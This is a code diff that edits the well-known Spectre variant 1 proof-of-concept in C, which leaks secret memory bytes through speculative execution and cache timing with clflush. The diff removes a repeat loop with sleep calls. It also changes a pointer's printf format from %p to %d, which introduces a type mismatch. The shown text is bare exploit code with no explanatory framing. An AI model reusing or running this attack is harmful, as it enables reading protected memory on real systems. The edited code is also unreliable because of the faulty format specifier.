@@ -48,7 +48,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
-
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
@@ -103,9 +102,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 int main(int argc,
   const char * * argv) {
-  int t;
-  for(t=0; t<10; t++) {
-    sleep(2);
   size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
   int i, score[2], len = 40;
   uint8_t value[2];
@@ -133,7 +129,7 @@ int main(int argc,
 
   printf("Reading %d bytes:\n", len);
   while (--len >= 0) {
-    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
+    printf("Reading at malicious_x = %d... ", (void * ) malicious_x);
     readMemoryByte(malicious_x++, value, score);
    // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X='%c' score=%d ", value[0],
@@ -142,6 +138,5 @@ int main(int argc,
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
-}
   return (0);
 }
